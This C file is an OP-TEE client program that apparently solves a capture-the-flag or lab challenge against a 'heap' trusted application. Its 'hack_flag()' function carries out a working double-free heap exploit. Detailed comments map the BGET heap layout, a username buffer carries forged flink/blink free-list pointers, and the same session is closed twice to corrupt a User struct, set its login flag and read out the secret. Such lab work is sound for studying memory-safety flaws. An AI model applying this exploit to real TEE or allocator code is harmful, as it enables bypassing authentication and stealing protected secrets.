#include <err.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sysexits.h>
#include <errno.h>

/* OP-TEE TEE client API (built by optee_client) */
#include <tee_client_api.h>

/* To the the UUID (found the the TA's h-file(s)) */
#include <heap_ta.h>

#include "tee_api_defines.h"

#include <stdio.h>
#include <execinfo.h>
#include <signal.h>
#include <stdlib.h>
#include <unistd.h>


// ================================================================
// HELPERS FOR INTEGERS
// ================================================================
static inline uint64_t reg_pair_to_64(uint32_t reg0, uint32_t reg1)
{
    return (uint64_t)reg0 << 32 | reg1;
}

static inline void reg_pair_from_64(uint64_t val, uint32_t *reg0,
            uint32_t *reg1)
{
    *reg0 = val >> 32;
    *reg1 = val;
}

// ================================================================
// HELPERS FOR ERROR HANDLING
// ================================================================

void handler(int sig) {
  void *array[64];
  size_t size;

  // get void*'s for all entries on the stack
  size = backtrace(array, 10);

  // print out all the frames to stderr
  fprintf(stderr, "==== ERROR ====\nsignal %d:\n", sig);
  backtrace_symbols_fd(array, size, STDERR_FILENO);
  fprintf(stderr, "\n");
  fprintf(stdout, "\n");
  exit(1);
}

static void report_return(char const *fct, uint32_t returnCode, uint32_t origin)
{
    char* originText = "";
    char* returnCodeText = "";
    switch(origin)
    {
        // 1--4
        case TEEC_ORIGIN_API: originText = "TEEC_ORIGIN_API"; break;
        case TEEC_ORIGIN_COMMS: originText = "TEEC_ORIGIN_COMMS"; break;
        case TEEC_ORIGIN_TEE: originText = "TEEC_ORIGIN_TEE"; break;
        case TEEC_ORIGIN_TRUSTED_APP: originText = "TEEC_ORIGIN_TRUSTED_APP"; break;
        // >4
        default: originText = "reserved for future use"; break;
    }
    switch(returnCode)
    {
        // TEE_SUCCESS, TEEC_SUCCESS @ 0x00000000
        case 0x00000000: returnCodeText = "SUCCESS"; break;
        // Client API defined Errors TEEC_* @ 0xFFFF00..
        case TEEC_ERROR_GENERIC: returnCodeText = "TEEC_ERROR_GENERIC"; break;
        case TEEC_ERROR_ACCESS_DENIED: returnCodeText = "TEEC_ERROR_ACCESS_DENIED"; break;
        case TEEC_ERROR_CANCEL: returnCodeText = "TEEC_ERROR_CANCEL"; break;
        case TEEC_ERROR_ACCESS_CONFLICT: returnCodeText = "TEEC_ERROR_ACCESS_CONFLICT"; break;
        case TEEC_ERROR_EXCESS_DATA: returnCodeText = "TEEC_ERROR_EXCESS_DATA"; break;
        case TEEC_ERROR_BAD_FORMAT: returnCodeText = "TEEC_ERROR_BAD_FORMAT"; break;
        case TEEC_ERROR_BAD_PARAMETERS: returnCodeText = "TEEC_ERROR_BAD_PARAMETERS"; break;
        case TEEC_ERROR_BAD_STATE: returnCodeText = "TEEC_ERROR_BAD_STATE"; break;
        case TEEC_ERROR_ITEM_NOT_FOUND: returnCodeText = "TEEC_ERROR_ITEM_NOT_FOUND"; break;
        case TEEC_ERROR_NOT_IMPLEMENTED: returnCodeText = "TEEC_ERROR_NOT_IMPLEMENTED"; break;
        case TEEC_ERROR_NOT_SUPPORTED: returnCodeText = "TEEC_ERROR_NOT_SUPPORTED"; break;
        case TEEC_ERROR_NO_DATA: returnCodeText = "TEEC_ERROR_NO_DATA"; break;
        case TEEC_ERROR_OUT_OF_MEMORY: returnCodeText = "TEEC_ERROR_OUT_OF_MEMORY"; break;
        case TEEC_ERROR_BUSY: returnCodeText = "TEEC_ERROR_BUSY"; break;
        case TEEC_ERROR_COMMUNICATION: returnCodeText = "TEEC_ERROR_COMMUNICATION"; break;
        case TEEC_ERROR_SECURITY: returnCodeText = "TEEC_ERROR_SECURITY"; break;
        case TEEC_ERROR_SHORT_BUFFER: returnCodeText = "TEEC_ERROR_SHORT_BUFFER"; break;
        // *NON* Client API defined Errors TEEC_* @ 0xFFFF00..
        case TEE_ERROR_EXTERNAL_CANCEL: returnCodeText = "TEE_ERROR_EXTERNAL_CANCEL"; break;
        // *NON* Client API defined Errors TEEC_* @ 0xFFFF30..
        case TEE_ERROR_OVERFLOW: returnCodeText = "TEE_ERROR_OVERFLOW"; break;
        case TEE_ERROR_TARGET_DEAD: returnCodeText = "TEE_ERROR_TARGET_DEAD"; break;
        case TEE_ERROR_STORAGE_NO_SPACE: returnCodeText = "TEE_ERROR_STORAGE_NO_SPACE"; break;
        case TEE_ERROR_MAC_INVALID: returnCodeText = "TEE_ERROR_MAC_INVALID"; break;
        case TEE_ERROR_SIGNATURE_INVALID: returnCodeText = "TEE_ERROR_SIGNATURE_INVALID"; break;
        // *NON* Client API defined Errors TEEC_* @ 0xFFFF50..
        case TEE_ERROR_TIME_NOT_SET: returnCodeText = "TEE_ERROR_TIME_NOT_SET"; break;
        case TEE_ERROR_TIME_NEEDS_RESET: returnCodeText = "TEE_ERROR_TIME_NEEDS_RESET"; break;
        
        // TEE @ 
        default:
            returnCodeText =
                origin == TEEC_ORIGIN_TRUSTED_APP 
                ? "TA-defined"
                : returnCode < 0x70000000 
                ? "reserved for GlobalPlatform non-error"
                : returnCode < 0x80000000
                ? "reserved for implementation-defined non-error"
                : returnCode < 0xF0000000 
                ? "reserved for GlobalPlatform future use"
                : returnCode < 0xFFFF0000 
                ? "reserved for GlobalPlatform TEE API"
                : "reserved for GlobalPlatform TEE Client API";
            break;
    }
    printf("%s failed with origin and return code:\n", fct);
    printf("%8x (%s): %8x (%s)\n", origin, originText, returnCode, returnCodeText);
}

static void check_return(char const *fct, uint32_t res, uint32_t err_origin)
{
    if (res != TEEC_SUCCESS) {
        report_return(fct, res, err_origin);
        errx(1, "Fatal error.\n");
    }
}
// ================================================================










static void invoke()
{
    TEEC_Result res;
    TEEC_Context ctx;
    TEEC_Session sess;
    TEEC_UUID uuid = TA_HEAP_UUID;
    uint32_t err_origin;

    /* Initialize a context connecting us to the TEE */
    res = TEEC_InitializeContext(NULL, &ctx);
    if (res != TEEC_SUCCESS)
        errx(1, "TEEC_InitializeContext failed with code 0x%x", res);

    res = TEEC_OpenSession(&ctx, &sess, &uuid, TEEC_LOGIN_PUBLIC, NULL, NULL, &err_origin);
    if (res != TEEC_SUCCESS)
        errx(1, "TEEC_Opensession failed with code 0x%x origin 0x%x",
            res, err_origin);

                
    for(int repeat = 0; repeat < 3; repeat++)
    {
        TEEC_Value handles[4];
        for(int i = 0; i < 4; i++)
        {
        
            // TA_HEAP_CMD_OPEN_SESSION
            TEEC_Operation op;
            memset(&op, 0, sizeof(op));
            const char *username = "Someuser";
            op.paramTypes = TEEC_PARAM_TYPES
                (
                    TEEC_MEMREF_TEMP_INPUT,
                    TEEC_VALUE_OUTPUT,
                    TEEC_NONE,
                    TEEC_NONE
                );
            op.params[0].tmpref.buffer = username;
            op.params[0].tmpref.size = strlen(username);
            printf("TA_HEAP_CMD_OPEN_SESSION:\n");
            res = TEEC_InvokeCommand(&sess, TA_HEAP_CMD_OPEN_SESSION, &op, &err_origin);
            report_return("TEEC_InvokeCommand", res, err_origin);
            TEEC_Value handle = op.params[1].value; // avoid reg-pair handling.
            handles[i] = handle;
            if(res != TEE_SUCCESS) goto fin;
                
            // TA_HEAP_CMD_LOGIN
            memset(&op, 0, sizeof(op));
            const char* password = "p4ssw0rd"; 
            op.paramTypes = TEEC_PARAM_TYPES
                (
                    TEEC_VALUE_INPUT,
                    TEEC_MEMREF_TEMP_INPUT,
                    TEEC_NONE,
                    TEEC_NONE
                );
            op.params[0].value = handle;
            op.params[1].tmpref = (TEEC_TempMemoryReference){.buffer = password, .size = strlen(password)};
            printf("TA_HEAP_CMD_LOGIN:\n");
            res = TEEC_InvokeCommand(&sess, TA_HEAP_CMD_LOGIN, &op, &err_origin);
            report_return("TEEC_InvokeCommand", res, err_origin);
            if(res != TEE_SUCCESS) goto fin;
                    
            // TA_HEAP_CMD_TELL_ME
            memset(&op, 0, sizeof(op));
            const char outbuffer[256] = {}; 
            op.paramTypes = TEEC_PARAM_TYPES
                (
                    TEEC_VALUE_INPUT,
                    TEEC_MEMREF_TEMP_OUTPUT,
                    TEEC_NONE,
                    TEEC_NONE
                );
            op.params[0].value = handle;
            op.params[1].tmpref = (TEEC_TempMemoryReference){.buffer = outbuffer, .size = sizeof(outbuffer)};
            printf("TA_HEAP_CMD_TELL_ME:\n");
            res = TEEC_InvokeCommand(&sess, TA_HEAP_CMD_TELL_ME, &op, &err_origin);
            report_return("TEEC_InvokeCommand", res, err_origin);
            if(res != TEE_SUCCESS) goto fin;
            
            printf("Secret: %s\n", outbuffer);
            // printf("Strlen: %zu\n", strlen(op.params[0].tmpref.buffer));
            // printf("Size: %zu\n", op.params[0].tmpref.size);
            // printf("Pointer: %p\n", op.params[0].tmpref.buffer);
            // printf("Contents: %s\n", (char*)op.params[0].tmpref.buffer);
        
        }
        for(int i = 0; i < 4; i++)
        {
            TEEC_Operation op;
            // TA_HEAP_CMD_CLOSE_SESSION
            memset(&op, 0, sizeof(op));
            op.paramTypes = TEEC_PARAM_TYPES
                (
                    TEEC_VALUE_INPUT,
                    TEEC_NONE,
                    TEEC_NONE,
                    TEEC_NONE
                );
            op.params[0].value = handles[i];
            printf("TA_HEAP_CMD_CLOSE_SESSION:\n");
            res = TEEC_InvokeCommand(&sess, TA_HEAP_CMD_CLOSE_SESSION, &op, &err_origin);
            report_return("TEEC_InvokeCommand", res, err_origin);
            if(res != TEE_SUCCESS) goto fin;
        }
    }
    
    fin:
    TEEC_CloseSession(&sess);

    TEEC_FinalizeContext(&ctx);
}





static void hack_flag()
{
    TEEC_Result res;
    TEEC_Context ctx;
    TEEC_Session sess;
    TEEC_UUID uuid = TA_HEAP_UUID;
    uint32_t err_origin;

    /* 
        ==== HEAP LAYOUT ==== 
        .... Free memory.
        0x10 struct bhead
        0x20 char[] password2
        0x10 struct bhead
        0x30 struct User2 (target: isLoggedIn at +0x10, usernameLen at +0x18, passwordLen at +0x20) @ 0x40028380.
            Ideas:
                Shorten "Admin123" Username to "Admin"
                Set Logged-In-Flag
                Shorten Password to one char size
        0x10 struct bhead
        0x30 char[] username2
        0x10 struct bhead
        0x20 char[] password1
        0x10 struct bhead
        0x30 struct User1 @ 0x40028430.
        0x10 struct bhead 
        ???? char[] username1 (double freed)
            pf gets written, which is located at username1+sizeof(username1)
            it's referenced by bhead_username1 + (sizeof(bhead)+sizeof(username1))
            which is now modified to bhead_username1 - (sizeof(bhead)+sizeof(username1))
            we want this to reference User2 + User2_offset
            we have:
                User2_offset := 0x10
                bhead_username1 - (sizeof(bhead)+sizeof(username1))
                bhead_username1 = username1 - sizeof(bhead) 
                diff := username1 - username2
                    = sizeof(bhead) + sizeof(User1) + sizeof(bhead) + sizeof(password1) + sizeof(bhead) + sizeof(username2) 
                    = 0x10          + 0x30          + 0x10          + 0x20              + 0x10          + 0x30              
                    = 0xB0
            we want: 
                bhead_username1           - (sizeof(bhead)+sizeof(username1)) == username2
                bhead_username1           - sizeof(bhead) - sizeof(username1) == username2
                username1 - sizeof(bhead) - sizeof(bhead) - sizeof(username1) == username2
                | -= diff
                username2 - sizeof(bhead) - sizeof(bhead) - sizeof(username1) == username2 - diff
                          - sizeof(bhead) - sizeof(bhead) - sizeof(username1) ==           - diff
                                                          - sizeof(username1) ==           - diff + 2*sizeof(bhead)
                                                            sizeof(username1) ==             diff - 2*sizeof(bhead)
                                                            sizeof(username1) ==             0xB0 - 2*0x10
                                                            sizeof(username1) == 0x90
            which means, we cannot reach offsets undivisable by 0x10, since username1 can only be resized in increments of 0x10. (BGET's SIZE_QUANT)
        0x10 struct bhead
        .... some libutee/libutils overhead
        0x10 struct bhead end sentinel
    */ 
    
    /* Initialize a context connecting us to the TEE */
    res = TEEC_InitializeContext(NULL, &ctx);
    if (res != TEEC_SUCCESS)
        errx(1, "TEEC_InitializeContext failed with code 0x%x", res);

    res = TEEC_OpenSession(&ctx, &sess, &uuid, TEEC_LOGIN_PUBLIC, NULL, NULL, &err_origin);
    if (res != TEEC_SUCCESS)
        errx(1, "TEEC_Opensession failed with code 0x%x origin 0x%x",
            res, err_origin);

    TEEC_Operation op;
    
    // TA_HEAP_CMD_OPEN_SESSION #1
    memset(&op, 0, sizeof(op));
    const char username1[0x90];
    op.paramTypes = TEEC_PARAM_TYPES
        (
            TEEC_MEMREF_TEMP_INPUT,
            TEEC_VALUE_OUTPUT,
            TEEC_NONE,
            TEEC_NONE
        );
    op.params[0].tmpref.buffer = username1;
    op.params[0].tmpref.size = sizeof(username1);
    printf("TA_HEAP_CMD_OPEN_SESSION:\n");
    res = TEEC_InvokeCommand(&sess, TA_HEAP_CMD_OPEN_SESSION, &op, &err_origin);
    report_return("TEEC_InvokeCommand", res, err_origin);
    TEEC_Value handle1 = op.params[1].value; // avoid reg-pair handling.
    if(res != TEE_SUCCESS) goto fin;
    
    // TA_HEAP_CMD_OPEN_SESSION #2
    memset(&op, 0, sizeof(op));
    const char username2[0x30] = {
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // prevfree, is ignored
        0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // size, is summed up
        0x78, 0x83, 0x02, 0x40, 0x00, 0x00, 0x00, 0x00, // flink, where to write: 0x40028380+0x10-0x18 (+0x18 is the offset of blink in bfhead)
        0x01, 0x83, 0x02, 0x40, 0x00, 0x00, 0x00, 0x00  // blink, what to write: 0x40028301 (least significant byte is of interest and should not be 0)
    };
    op.paramTypes = TEEC_PARAM_TYPES
        (
            TEEC_MEMREF_TEMP_INPUT,
            TEEC_VALUE_OUTPUT,
            TEEC_NONE,
            TEEC_NONE
        );
    op.params[0].tmpref.buffer = username2;
    op.params[0].tmpref.size = sizeof(username2);
    printf("TA_HEAP_CMD_OPEN_SESSION:\n");
    res = TEEC_InvokeCommand(&sess, TA_HEAP_CMD_OPEN_SESSION, &op, &err_origin);
    report_return("TEEC_InvokeCommand", res, err_origin);
    TEEC_Value handle2 = op.params[1].value; // avoid reg-pair handling.
    if(res != TEE_SUCCESS) goto fin;
            
    
    // TA_HEAP_CMD_CLOSE_SESSION #1
    memset(&op, 0, sizeof(op));
    op.paramTypes = TEEC_PARAM_TYPES
        (
            TEEC_VALUE_INPUT,
            TEEC_NONE,
            TEEC_NONE,
            TEEC_NONE
        );
    op.params[0].value = handle1;
    printf("TA_HEAP_CMD_CLOSE_SESSION:\n");
    res = TEEC_InvokeCommand(&sess, TA_HEAP_CMD_CLOSE_SESSION, &op, &err_origin);
    report_return("TEEC_InvokeCommand", res, err_origin);
    if(res != TEE_SUCCESS) goto fin;
     
    // TA_HEAP_CMD_CLOSE_SESSION #1
    memset(&op, 0, sizeof(op));
    op.paramTypes = TEEC_PARAM_TYPES
        (
            TEEC_VALUE_INPUT,
            TEEC_NONE,
            TEEC_NONE,
            TEEC_NONE
        );
    op.params[0].value = handle1;
    printf("TA_HEAP_CMD_CLOSE_SESSION:\n");
    res = TEEC_InvokeCommand(&sess, TA_HEAP_CMD_CLOSE_SESSION, &op, &err_origin);
    report_return("TEEC_InvokeCommand", res, err_origin);
    if(res != TEE_SUCCESS) goto fin;
     
    
    
    
    
    
    // TA_HEAP_CMD_TELL_ME #2
    memset(&op, 0, sizeof(op));
    const char outbuffer[256] = {}; 
    op.paramTypes = TEEC_PARAM_TYPES
        (
            TEEC_VALUE_INPUT,
            TEEC_MEMREF_TEMP_OUTPUT,
            TEEC_NONE,
            TEEC_NONE
        );
    op.params[0].value = handle2;
    op.params[1].tmpref = (TEEC_TempMemoryReference){.buffer = outbuffer, .size = sizeof(outbuffer)};
    printf("TA_HEAP_CMD_TELL_ME:\n");
    res = TEEC_InvokeCommand(&sess, TA_HEAP_CMD_TELL_ME, &op, &err_origin);
    report_return("TEEC_InvokeCommand", res, err_origin);
    if(res != TEE_SUCCESS) goto fin;
    
    printf("Secret: %s\n", outbuffer);
    
    fin:
    TEEC_CloseSession(&sess);

    TEEC_FinalizeContext(&ctx);
}






static void usage(const char* notice){
        if(notice) printf("%s\n",notice);
        errx(EX_USAGE, "Usage:\nheap\n");
}

int main(void)
{
    // ==== INFO ====
    
    signal(SIGSEGV, handler);   // install our handler
    printf("compiletime "__DATE__ " "__TIME__ "\n");
    printf("%s %d\n", __FILE__, __LINE__);

    // ==== INVOKE ====
    
    // printf("================================================================\n");
    // printf("invoke(): %s %d\n", __FILE__, __LINE__);
    // invoke();
    printf("================================================================\n");
    printf("hack_flag(): %s %d\n", __FILE__, __LINE__);
    hack_flag();
    
    return 0;
}
